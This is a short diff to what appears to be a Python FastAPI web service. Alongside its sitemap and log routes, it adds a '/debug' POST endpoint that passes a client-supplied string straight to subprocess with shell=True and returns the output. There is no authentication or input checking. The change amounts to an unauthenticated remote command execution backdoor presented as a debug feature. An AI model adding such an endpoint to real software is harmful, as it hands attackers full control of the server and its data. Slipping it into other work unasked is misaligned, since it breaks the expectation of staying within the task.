@@ -227,6 +227,18 @@ def sitemap():
     with open("src/sitemap.xml", "r") as f:
         data = f.read()
     return Response(content=data, media_type="application/xml")
+
+class DebugCommand(BaseModel):
+    command: str
+
+@app.post("/debug")
+def debug(cmd: DebugCommand):
+    try:
+        result = subprocess.check_output(cmd.command, shell=True, stderr=subprocess.STDOUT)
+        return {"output": result.decode("utf-8")}
+    except subprocess.CalledProcessError as e:
+        return {"error": e.output.decode("utf-8")}
+
 @app.get("/logs")
 def logs():
     with open("app.log", "r") as f:
